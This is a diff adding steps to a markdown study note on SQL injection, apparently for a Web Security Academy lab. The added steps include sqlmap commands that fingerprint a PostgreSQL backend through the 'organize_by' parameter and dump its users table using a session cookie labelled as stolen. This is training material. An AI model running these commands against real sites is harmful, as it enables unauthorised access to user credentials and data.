@@ -29,6 +29,21 @@ There is a built-in table on Oracle called dual which you can use for this purpo
 ![db-version-2](../img/sqli/sqli_db_version_2.png)
 
 #### App 1
+- scan **/advanced_search?SearchTerm=aa&organize_by=DATE&blogArtist=**
+- find that organize_by is vulnerable to SQLi
+- idetify DB type
+
+```
+sqlmap -u 'https://xx.web-security-academy.net/advanced_search?
+SearchTerm=test&organize_by=DATE&blogArtist=' -batch --banner --cookie="session=YOUR-STEALED-COOKIE"
+```
+- you should get something like this:
+```
+[INFO] adjusting time delay to 1 second due to good response times
+PostgreSQL 12.22 (Ubuntu...
+```
+- then exploit
+
 ```
 sqlmap -u 'https://...web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist=' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'organize_by'
 ```
